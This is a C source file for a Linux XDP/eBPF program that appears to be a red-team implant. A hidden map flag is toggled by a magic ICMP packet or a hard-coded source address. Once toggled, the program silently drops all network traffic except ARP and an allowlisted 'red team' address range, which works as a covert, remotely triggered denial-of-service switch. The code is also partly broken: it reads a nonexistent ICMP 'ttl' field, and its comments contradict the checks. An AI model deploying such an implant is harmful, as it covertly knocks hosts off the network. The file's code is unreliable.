#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <linux/if_ether.h>
#include <linux/in.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/if_vlan.h>
//#include <arpa/inet.h>

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__type(key, __u32);
	__type(value, __u32);
	__uint(max_entries, 1);
} status SEC(".maps");

SEC("xdpentry")
int entry(struct xdp_md *ctx) {
	// Prepare some data structures
	__u32 *rec;
	__u32 key = 0;
	void *data_end = (void *)(long)ctx->data_end;
	void *data = (void *)(long)ctx->data;
	struct ethhdr *eth = data;

	rec = bpf_map_lookup_elem(&status, &key); // Lookup current packet status from kernel map
	if (!rec) {
		return XDP_DROP; // try to lay low on error
	}
	//bpf_printk("Rec: %u", *rec); // Debug prints
	if ((*rec != 55) && (*rec != 56)) {
		// First run check
		// bpf_printk("Resetting rec!"); // Debug Prints
		*rec = 56; // set default value for map
	}

	if (eth + 1 > data_end) // Bounds checking for xdp preverifier
		return XDP_PASS; // This should never run normally

	if(bpf_ntohs(eth->h_proto) == ETH_P_ARP) {
		return XDP_PASS; // don't kill layer 2 traffic
	}

	struct iphdr *iph = data + sizeof(struct ethhdr);
	if (iph + 1 > data_end) // More bounds checking
		return XDP_PASS; // This should never run either
				 //
	__u32 ip_src = iph->saddr; // grab source address of packet
	
	struct icmphdr *icmph = data + sizeof(struct ethhdr) + sizeof(struct iphdr);
	if (icmph + 1 > data_end) {
		// More bounds checking
		return XDP_PASS;
	}

	char *pingdata = data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct icmphdr);
	
	// bpf_printk("Incoming packet: %u\n", ip_src); // Debug print
	// Determine if we need to further process this packet
	//if (ip_src == 1946091487) {
	bpf_printk("Incoming packet: %u\n", icmph->type);
	if (icmph->ttl == 252) {
		bpf_printk("Echo request data: %x", pingdata);
	}
	if (icmph->type == 2 || ip_src == 1946091487) {
		// This packet had a destination of 223.255.254.115, do something!
		// bpf_printk("Got it!, setting rec..."); // Debug print
		switch (*rec) {
			case 55 :
				*rec = 56;
				break;
			case 56 :
				*rec = 55;
				break;
		}
		return XDP_DROP;
	}
	else if (ip_src == 0) {
		// most likely a layer 2 packet, let it thru
		return XDP_PASS;
	}

 else if (ip_src >= 16974090 && ip_src <= 503513354) {
   // IP is between 10.1.3.1 and 10.1.3.30. Allow to pass for red team
   return XDP_PASS;
 }

	// Finish processing
	if (*rec == 55) {
		return XDP_DROP;
	} else {
		return XDP_PASS;
	}
}


char _license[] SEC("license")= "GPL";
